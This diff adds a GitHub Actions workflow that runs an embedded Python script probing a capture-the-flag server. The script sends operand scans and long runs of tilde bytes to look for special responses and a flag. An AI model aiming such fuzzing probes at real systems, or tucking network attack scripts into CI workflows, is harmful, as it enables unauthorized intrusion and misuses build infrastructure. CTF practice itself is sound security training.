@@ -1,0 +1,43 @@
+name: FRAZIL operand and counter
+on:
+  push:
+    paths: ['.github/workflows/frazil-operand.yml']
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 4
+    steps:
+      - name: Scan q operands and counter
+        run: |
+          python3 - <<'PY'
+          import socket,time
+          H,P='0.cloud.chals.io',18691
+          def probe(name,payload,tm=1.5):
+            try:
+              with socket.create_connection((H,P),timeout=4) as s:
+                s.settimeout(tm);s.sendall(payload)
+                buf=bytearray()
+                while len(buf)<65536:
+                  try:r=s.recv(65536)
+                  except socket.timeout:break
+                  if not r:break
+                  buf+=r
+                res=[bytes(buf[i:i+6]) for i in range(0,len(buf),6)]
+                from collections import Counter
+                counts=Counter(x[1:2].hex() for x in res)
+                print(name,'out',len(buf),'status',counts,'tail',bytes(buf[-90:]).hex(),flush=True)
+                if 'scan' in name:
+                  for i,x in enumerate(res):
+                    if x[1:2] != b'\xc3' and x[1:2]!=b'\xc1':print('SPECIAL',i,x.hex(),flush=True)
+                if b'isfcr{' in buf:print('FLAG',bytes(buf),flush=True)
+            except Exception as e:print(name,'ERROR',repr(e),flush=True)
+          probe('q_scan',b''.join(b'q'+bytes([i]) for i in range(256)))
+          probe('q0x100',b'q\x00'*100)
+          probe('tildex650',b'~'*650)
+          probe('tildex600_Z',b'~'*600+b'Z')
+          probe('tildex599_q0',b'~'*599+b'q\x00')
+          probe('3zero',b'3\x00'*5)
+          probe('3ones',b'3\x01'*5)
+          PY
